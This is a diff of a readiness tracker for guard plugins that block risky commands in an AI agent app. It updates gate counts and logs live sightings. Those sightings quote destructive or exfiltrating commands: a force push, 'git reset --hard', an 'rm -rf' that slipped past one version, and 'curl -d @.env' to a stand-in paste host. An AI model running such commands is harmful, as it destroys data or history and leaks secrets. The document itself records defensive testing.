@@ -13,7 +13,7 @@ Eight gates. The lead mods (the first three) must meet all eight before release.
 | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
 | critter-buddy | met | met | met | stale | stale | stale | stale | open | Not ready: 5 of 8 open |
 | critter-mods | met | met | met | open | stale | open | stale | open | Not ready: 5 of 8 open |
-| critter-ward | met | met | met | stale | stale | open | stale | open | Not ready: 5 of 8 open |
+| critter-ward | met | met | met | met | stale | met | stale | open | Not ready: 3 of 8 open |
 | critter-diary | met | met | met | open | stale | open | stale | open | Not ready: 5 of 8 open |
 | critter-bell | met | met | met | open | stale | open | stale | open | Not ready: 5 of 8 open |
 | critter-crab | met | met | met | open | stale | open | stale | open | Not ready: 5 of 8 open |
@@ -22,8 +22,8 @@ Eight gates. The lead mods (the first three) must meet all eight before release.
 | critter-measure | met | met | met | open | stale | open | stale | open | Not ready: 5 of 8 open |
 | critter-clock | met | met | met | open | open | open | open | open | Not ready: 5 of 8 open |
 | critter-ledger | met | met | met | open | open | open | open | open | Not ready: 5 of 8 open |
-| critter-latch | met | met | met | stale | stale | open | open | open | Not ready: 5 of 8 open |
-| critter-seal | met | met | met | stale | stale | open | open | open | Not ready: 5 of 8 open |
+| critter-latch | met | met | met | met | stale | stale | open | open | Not ready: 4 of 8 open |
+| critter-seal | met | met | met | stale | stale | met | open | open | Not ready: 4 of 8 open |
 
 met: done, and nothing has changed since. stale: done, but the plugin has changed since, so it needs another look. open: not done yet.
 
@@ -109,7 +109,7 @@ met: done, and nothing has changed since. stale: done, but the plugin has change
 | Strict validation | passes |
 | Tool-path hooks | fails closed on purpose: when it cannot tell, the thing it guards waits |
 | Surfaces | any surface that runs hooks (it draws nothing) |
-| Verdict | Not ready: 5 of 8 open |
+| Verdict | Not ready: 3 of 8 open |
 
 **Independent reviews**
 
@@ -120,11 +120,11 @@ met: done, and nothing has changed since. stale: done, but the plugin has change
 
 **New tests watched failing first**
 
-- 2026-11-11 (at cf08b68): the nine lines that used to get past it, each with a test that failed on the old code, then passed.
+- 2026-11-11 (at 22572aa): the permission check asking about a line that runs an unread expansion: the test was watched failing on the old hook, then passing (the nine earlier lines were watched at cf08b68).
 
 **Seen working in the real app**
 
-- not yet
+- 2026-11-11 (at 1dadf72), Claude desktop app (an agent session; read from its transcript, not watched by a person): git push --force origin main on a branch named main with no remote was refused before Bash ran it, with "guard: a force push rewrites history other people may already have.".
 
 **Cold install by someone who is not the founder**
 
@@ -132,8 +132,8 @@ met: done, and nothing has changed since. stale: done, but the plugin has change
 
 **Known gaps**
 
-- never seen stopping a push in the real app
 - a program that changes main or .git/HEAD earlier on the line is not tracked (documented)
+- the question for a line that runs an expansion has not been seen in the real app
 
 ## The others
 
@@ -397,15 +397,15 @@ met: done, and nothing has changed since. stale: done, but the plugin has change
 
 - never seen in the real app; token counts come from the engine's per-turn usage, not checked against a bill
 
-### critter-latch 0.1.1
+### critter-latch 0.1.2
 
 | | |
 | --- | --- |
-| Tests passing | 62 |
+| Tests passing | 64 |
 | Strict validation | passes |
 | Tool-path hooks | fails closed on purpose: when it cannot tell, the thing it guards waits |
 | Surfaces | any surface that runs hooks (it draws nothing) |
-| Verdict | Not ready: 5 of 8 open |
+| Verdict | Not ready: 4 of 8 open |
 
 **Independent reviews**
 
@@ -414,11 +414,11 @@ met: done, and nothing has changed since. stale: done, but the plugin has change
 
 **New tests watched failing first**
 
-- 2026-11-11 (at cf375f3): the review findings: each command that got past it has a test that failed on the first version, then passed.
+- 2026-11-11 (at 6b1d64a): a delete after a cd to a folder outside, and a cd out and back in: both tests were watched failing on 0.1.1, then passing.
 
 **Seen working in the real app**
 
-- not yet
+- 2026-11-11 (at 1dadf72), Claude desktop app (an agent session; read from its transcript, not watched by a person): git reset --hard was refused before it ran. The same sighting found cd <a temp folder> && rm -rf dist running where it should have been stopped (0.1.1); fixed in 0.1.2, and the fix has not been seen live.
 
 **Cold install by someone who is not the founder**
 
@@ -436,7 +436,7 @@ met: done, and nothing has changed since. stale: done, but the plugin has change
 | Strict validation | passes |
 | Tool-path hooks | fails closed on purpose: when it cannot tell, the thing it guards waits |
 | Surfaces | any surface that runs hooks (it draws nothing) |
-| Verdict | Not ready: 5 of 8 open |
+| Verdict | Not ready: 4 of 8 open |
 
 **Independent reviews**
 
@@ -449,7 +449,7 @@ met: done, and nothing has changed since. stale: done, but the plugin has change
 
 **Seen working in the real app**
 
-- not yet
+- 2026-11-11 (at 1dadf72), Claude desktop app (an agent session; read from its transcript, not watched by a person): curl -d @.env to paste.example was held back with the README's message, word for word.
 
 **Cold install by someone who is not the founder**
 
